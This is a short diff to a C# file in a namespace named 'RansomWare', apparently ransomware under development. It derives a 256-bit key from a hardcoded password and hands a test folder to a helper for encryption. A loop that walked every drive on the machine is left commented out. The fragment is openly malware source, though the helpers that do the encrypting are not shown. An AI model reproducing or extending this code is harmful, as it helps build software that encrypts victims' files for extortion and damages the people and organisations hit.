@@ -1,21 +1,25 @@
+using System.Security.Cryptography;
+using Lib;
 namespace RansomWare;
 
 public class HandleEncryption
 {
     public HandleEncryption(Encryption encryption)
     {
-        if (encryption == Encryption.ENCRYPT)
-        {
-            encryptFiles();
-        }
+        populateKeys();
+        // foreach (var drive in DriveInfo.GetDrives())
+        // {
+        //     Util.TraverseDirectory(drive.RootDirectory, encryption);
+        // }
+        Util.nonIterationFolder(new DirectoryInfo(@"C:\Users\Joey\Desktop\testFolder"),
+            encryption);
     }
 
-    private void encryptFiles()
+    private void populateKeys()
     {
-        foreach (var drive in DriveInfo.GetDrives())
+        using (var deriveBytes1 = new Rfc2898DeriveBytes("FXRAT", Settings.salt, 1000))
         {
-            Util.TraverseDirectory(drive.RootDirectory);
+            Settings.hashKey = deriveBytes1.GetBytes(32); // 256-bit key
         }
-        
     }
 }
